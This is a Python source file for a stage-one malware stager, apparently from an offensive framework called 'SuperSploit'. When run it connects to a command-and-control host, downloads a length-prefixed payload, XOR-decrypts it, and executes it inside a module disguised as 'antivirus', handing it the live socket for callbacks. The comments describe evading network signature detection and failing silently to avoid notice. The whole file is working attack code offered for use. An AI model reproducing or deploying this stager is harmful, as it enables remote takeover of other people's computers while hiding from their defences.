import types
from socket import socket, AF_INET, SOCK_STREAM


# --- FRAMEWORK TEMPLATE VARIABLES ---
# SuperSploit will dynamically overwrite these values during payload generation.
C2_HOST = "127.0.0.1"
C2_PORT = 5000
XOR_KEY = b"super_secret_key"

class Start:
    
    def __init__(self):
        self.s = socket(AF_INET, SOCK_STREAM)
        
        # Only attempt to receive and execute if the connection succeeds
        if self.connect(C2_HOST, C2_PORT):
            encrypted_payload = self.recv_all()
            if encrypted_payload:
                decrypted_payload = self.xor(encrypted_payload, XOR_KEY)
                self.exc(decrypted_payload)
                
        # Clean up the file descriptor silently
        self.s.close()
    
    def connect(self, host, port):
        try:
            self.s.connect((host, port))
            return True
        except ConnectionError:
            return False
        
    def recv_all(self):
        try:
            # 1. Read the first 4 bytes to determine the total payload length
            raw_length = self._recv_exact(4)
            if not raw_length:
                return None
            
            payload_length = int.from_bytes(raw_length, 'big')
            
            # 2. Read exactly the expected number of bytes to reconstruct the fragmented stream
            return self._recv_exact(payload_length)
        except OSError:
            return None
            
    def _recv_exact(self, n):
        # Helper function to reliably read exactly n bytes, handling TCP fragmentation
        data = bytearray()
        while len(data) < n:
            packet = self.s.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)

    def xor(self, data, key):
        # Fast, lightweight XOR decryption loop. 
        # Reconstructs the original payload bypassing network signature detection.
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    def exc(self, payload):
        name_space = "antivirus"
        virtual_module = types.ModuleType(name_space)
        
        # Inject the active network socket into the module's global namespace
        # so the Stage 2 payload can communicate back to SuperSploit.
        virtual_module.__dict__['client_socket'] = self.s
        
        try:
            exec(payload, virtual_module.__dict__)
        except Exception:
            # In a stager, we silently fail to avoid dropping loud stack traces
            pass
            
# Initialize and execute the stager automatically
Start()
